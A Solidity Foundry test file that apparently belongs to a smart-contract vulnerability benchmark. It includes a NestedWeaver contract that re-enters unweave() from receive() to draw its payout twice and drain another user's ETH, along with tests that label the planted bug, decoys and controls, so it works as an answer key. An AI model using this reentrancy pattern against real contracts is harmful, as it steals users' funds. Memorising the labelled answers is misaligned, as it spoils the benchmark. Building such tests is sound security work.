// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Paydirt proof, pair sol-04. This file is the single source of the test bodies:
// test/Fixed.t.sol is generated from it by make-fixed-test.mjs (import path and
// contract name only), so both variants are checked by identical assertions.

import {Test} from "forge-std/Test.sol";
import {Cinderloom} from "../src/vulnerable/Cinderloom.sol";

contract ProofToken {
    string public constant name = "Proof Filament";
    string public constant symbol = "PFIL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 quantity) external {
        balanceOf[to] += quantity;
        totalSupply += quantity;
    }

    function approve(address spender, uint256 quantity) external returns (bool) {
        allowance[msg.sender][spender] = quantity;
        return true;
    }

    function transfer(address to, uint256 quantity) external returns (bool) {
        balanceOf[msg.sender] -= quantity;
        balanceOf[to] += quantity;
        return true;
    }

    function transferFrom(address from, address to, uint256 quantity) external returns (bool) {
        allowance[from][msg.sender] -= quantity;
        balanceOf[from] -= quantity;
        balanceOf[to] += quantity;
        return true;
    }
}

/// A participant whose receive() calls unweave() once while drawEmbers() is paying it.
contract NestedWeaver {
    Cinderloom public immutable loom;
    ProofToken public immutable token;
    bool private armed;
    bool public nestedCallSucceeded;
    uint256 public paymentsReceived;

    constructor(Cinderloom loom_, ProofToken token_) {
        loom = loom_;
        token = token_;
    }

    function weave(uint256 quantity) external {
        token.approve(address(loom), quantity);
        loom.weave(quantity);
    }

    function strike() external {
        armed = true;
        loom.drawEmbers();
        armed = false;
    }

    receive() external payable {
        paymentsReceived += 1;
        if (armed) {
            armed = false;
            try loom.unweave() {
                nestedCallSucceeded = true;
            } catch {}
        }
    }
}

contract VulnerableTest is Test {
    uint256 internal constant SPAN = 10 days; // 864_000 s
    uint256 internal constant FUEL = 8.64 ether; // => exactly 1e13 wei per second, no dust
    uint256 internal constant STAKE = 100e18;

    Cinderloom internal loom;
    ProofToken internal token;
    NestedWeaver internal nested;

    address internal steward = makeAddr("steward");
    address internal firekeeper = makeAddr("firekeeper");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    function setUp() public {
        token = new ProofToken();
        loom = new Cinderloom(address(token), steward, firekeeper, SPAN);
        nested = new NestedWeaver(loom, token);

        token.mint(alice, 1_000e18);
        token.mint(bob, 1_000e18);
        token.mint(address(nested), STAKE);
        vm.prank(alice);
        token.approve(address(loom), type(uint256).max);
        vm.prank(bob);
        token.approve(address(loom), type(uint256).max);
        vm.deal(firekeeper, 100 ether);
    }

    function _kindle(uint256 value) internal {
        vm.prank(firekeeper);
        loom.kindle{value: value}();
    }

    /// Alice and the nested participant each weave 100 filaments, one 8.64 ETH burn runs
    /// to completion, so each is owed exactly 4.32 ETH.
    function _twoEqualWeavesAfterFullBurn() internal {
        vm.prank(alice);
        loom.weave(STAKE);
        nested.weave(STAKE);
        _kindle(FUEL);
        assertEq(loom.embersPerSecond(), 1e13, "rate");
        assertEq(loom.looseEmbers(), 0, "no scheduling dust");
        vm.warp(block.timestamp + SPAN);
        assertEq(loom.embersOf(alice), 4.32 ether, "alice owed");
        assertEq(loom.embersOf(address(nested)), 4.32 ether, "nested owed");
        assertEq(address(loom).balance, 8.64 ether, "loom holds exactly both entitlements");
    }

    // ------------------------------------------------------------------ planted

    /// P1: a receiver that calls unweave() from inside drawEmbers() is paid its 4.32 ETH
    /// twice (8.64 ETH), which is Alice's 4.32 ETH; Alice can no longer be paid.
    function test_planted_P1() public {
        _twoEqualWeavesAfterFullBurn();

        nested.strike();

        // paid twice: 2 x 4.32 ETH, i.e. the whole burn
        assertEq(address(nested).balance, 8.64 ether, "nested participant received double its entitlement");
        assertEq(nested.paymentsReceived(), 2, "two native payments for one entitlement");
        // the nested unweave() went through while drawEmbers() was still paying
        assertTrue(nested.nestedCallSucceeded(), "nested unweave() executed inside drawEmbers()");
        assertEq(token.balanceOf(address(nested)), STAKE, "and its filaments back");
        // the second payment came out of Alice's backing
        assertEq(address(loom).balance, 0, "loom drained");
        assertEq(loom.embersOf(alice), 4.32 ether, "alice is still owed 4.32 ETH on the books");
        vm.prank(alice);
        vm.expectRevert(Cinderloom.NativeDeliveryFailed.selector);
        loom.drawEmbers();
    }

    // ------------------------------------------------------------------- decoys

    /// D1: the unchecked subtractions in loosen() cannot wrap. Anything above the
    /// caller's own filaments reverts before the block; the exact amount lands on zero.
    function test_decoy_D1() public {
        vm.prank(alice);
        loom.weave(100e18);
        vm.prank(bob);
        loom.weave(40e18);

        // one wei more than the caller holds (but less than the loom total): rejected
        vm.prank(bob);
        vm.expectRevert(Cinderloom.BadQuantity.selector);
        loom.loosen(40e18 + 1);
        // more than the loom total: rejected
        vm.prank(alice);
        vm.expectRevert(Cinderloom.BadQuantity.selector);
        loom.loosen(140e18 + 1);
        // zero: rejected
        vm.prank(alice);
        vm.expectRevert(Cinderloom.BadQuantity.selector);
        loom.loosen(0);
        // an account with nothing woven cannot move the total
        vm.expectRevert(Cinderloom.BadQuantity.selector);
        loom.loosen(1);

        // exact boundary: bob takes everything he has
        vm.prank(bob);
        loom.loosen(40e18);
        assertEq(loom.filamentsOf(bob), 0);
        assertEq(loom.totalFilaments(), 100e18);
        assertEq(token.balanceOf(bob), 1_000e18);

        vm.prank(alice);
        loom.loosen(99e18);
        assertEq(loom.filamentsOf(alice), 1e18);
        assertEq(loom.totalFilaments(), 1e18);
        assertEq(token.balanceOf(address(loom)), 1e18);
    }

    /// D1 (fuzz): for any request, loosen() either reverts or leaves both counters
    /// exactly reduced and still equal to the tokens held.
    function testFuzz_decoy_D1(uint256 aliceWoven, uint256 bobWoven, uint256 request) public {
        aliceWoven = bound(aliceWoven, 1, 1_000e18);
        bobWoven = bound(bobWoven, 1, 1_000e18);
        vm.prank(alice);
        loom.weave(aliceWoven);
        vm.prank(bob);
        loom.weave(bobWoven);

        vm.prank(bob);
        if (request == 0 || request > bobWoven) {
            vm.expectRevert(Cinderloom.BadQuantity.selector);
            loom.loosen(request);
            assertEq(loom.filamentsOf(bob), bobWoven);
            assertEq(loom.totalFilaments(), aliceWoven + bobWoven);
        } else {
            loom.loosen(request);
            assertEq(loom.filamentsOf(bob), bobWoven - request);
            assertEq(loom.totalFilaments(), aliceWoven + bobWoven - request);
        }
        assertEq(loom.filamentsOf(alice), aliceWoven);
        assertEq(token.balanceOf(address(loom)), loom.totalFilaments());
    }

    // ----------------------------------------------------------------- controls

    /// Ordinary accounts are paid once by drawEmbers() and the loom stays solvent.
    function test_control_drawPaysOnce() public {
        _twoEqualWeavesAfterFullBurn();

        vm.prank(alice);
        loom.drawEmbers();
        assertEq(alice.balance, 4.32 ether);
        assertEq(loom.embersOf(alice), 0);
        vm.prank(alice);
        vm.expectRevert(Cinderloom.BadQuantity.selector);
        loom.drawEmbers();
        assertEq(address(loom).balance, 4.32 ether, "the other entitlement is untouched");
    }

    /// unweave() on its own returns the filaments and pays the entitlement once.
    function test_control_unweavePaysOnce() public {
        _twoEqualWeavesAfterFullBurn();

        vm.prank(alice);
        loom.unweave();
        assertEq(alice.balance, 4.32 ether);
        assertEq(token.balanceOf(alice), 1_000e18);
        assertEq(loom.filamentsOf(alice), 0);
        assertEq(loom.totalFilaments(), STAKE);
        vm.prank(alice);
        vm.expectRevert(Cinderloom.BadQuantity.selector);
        loom.unweave();
        assertEq(address(loom).balance, 4.32 ether, "the other entitlement is untouched");
    }
}
